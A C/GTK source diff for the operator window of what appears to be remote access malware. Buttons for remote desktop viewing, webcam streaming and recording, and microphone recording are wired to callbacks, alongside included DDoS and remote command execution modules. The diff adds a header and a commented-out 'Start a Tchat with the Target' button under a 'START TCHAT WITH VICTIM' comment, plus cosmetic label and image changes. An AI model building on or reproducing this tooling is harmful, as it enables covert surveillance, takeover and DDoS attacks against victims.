@@ -22,6 +22,7 @@
 #include "../includes/callbacks_ddos.h"
 #include "../includes/callbacks_rudy_arme_ddos.h"
 #include "../includes/callbacks_execute_commands.h"
+#include "../includes/callbacks_tchat.h"
 
 
 GtkWidget *main_win = NULL;
@@ -146,6 +147,10 @@ void fill_window(char *argv[])
     GtkWidget *stream_webcam = NULL;
     GtkWidget *record_webcam = NULL;
     GtkWidget *record_micro = NULL;
+    
+    /* Start a tchat vars */
+    GtkWidget *start_tchat = NULL;
+    
 
     /** Initialize the zone[0] for blit widgets **/
     zone[0] = gtk_fixed_new();
@@ -177,7 +182,7 @@ void fill_window(char *argv[])
     background[5] = gtk_image_new_from_file("images/main_BG.jpg");
 
     image_decoration[0] = gtk_image_new_from_file("images/crane2.png");
-    //image_decoration[1] = gtk_image_new_from_file("images/Celtic-Knot.png");
+    //image_decoration[1] = gtk_image_new_from_file("images/deadface.png");
     image_decoration[2] = gtk_image_new_from_file("images/Celtic-Art.png");
     image_decoration[3] = gtk_image_new_from_file("images/dragon.png");
     image_decoration[4] = gtk_image_new_from_file("images/dragon_right.png");
@@ -228,7 +233,7 @@ void fill_window(char *argv[])
 
     /* Insert image of the tab pages */
     gtk_fixed_put(GTK_FIXED(zone[0]), image_decoration[0], 30, 10);
-    //gtk_fixed_put(GTK_FIXED(zone[1]), image_decoration[1], 1020, 460);
+    //gtk_fixed_put(GTK_FIXED(zone[2]), image_decoration[1], 600, 60);
     gtk_fixed_put(GTK_FIXED(zone[2]), image_decoration[2], 145, 440);
     gtk_fixed_put(GTK_FIXED(zone[0]), image_decoration[3], 270, 220);
     gtk_fixed_put(GTK_FIXED(zone[0]), image_decoration[4], 700, 220);
@@ -617,21 +622,28 @@ void fill_window(char *argv[])
     gtk_fixed_put(GTK_FIXED(zone[0]), remote_desktop, 850, 50);
     g_signal_connect(G_OBJECT(remote_desktop), "clicked", G_CALLBACK(cb_watch_remote_desktop), NULL);
 
-    stream_webcam = gtk_button_new_with_label("Stream The WebCam");
+    stream_webcam = gtk_button_new_with_label("Stream The WebCam.");
     gtk_widget_set_size_request(stream_webcam, 200, 30);
     gtk_fixed_put(GTK_FIXED(zone[0]), stream_webcam, 850, 100);
     g_signal_connect(G_OBJECT(stream_webcam), "clicked", G_CALLBACK(cb_stream_the_webcam), NULL);
 
-    record_webcam = gtk_button_new_with_label("Record The WebCam");
+    record_webcam = gtk_button_new_with_label("Record The WebCam.");
     gtk_widget_set_size_request(record_webcam, 200, 30);
     gtk_fixed_put(GTK_FIXED(zone[0]), record_webcam, 850, 150);
     g_signal_connect(G_OBJECT(record_webcam), "clicked", G_CALLBACK(cb_record_webcam), NULL);
     
-    record_micro = gtk_button_new_with_label("Record The Microphone");
+    record_micro = gtk_button_new_with_label("Record The Microphone.");
     gtk_widget_set_size_request(record_micro, 200, 30);
     gtk_fixed_put(GTK_FIXED(zone[0]), record_micro, 850, 200);
     g_signal_connect(G_OBJECT(record_micro), "clicked", G_CALLBACK(cb_record_micro), NULL);
     
+    
+    /*  START TCHAT WITH VICTIM */
+    
+    //start_tchat = gtk_button_new_with_label("Start a Tchat with the Target.");
+    //gtk_widget_set_size_request(start_tchat, 200, 30);
+    //gtk_fixed_put(GTK_FIXED(zone[0]), start_tchat, 850, 250);
+    //g_signal_connect(G_OBJECT(start_tchat), "clicked", G_CALLBACK(cb_start_tchat), NULL);
     
     /** TAB CLIENTS */
     
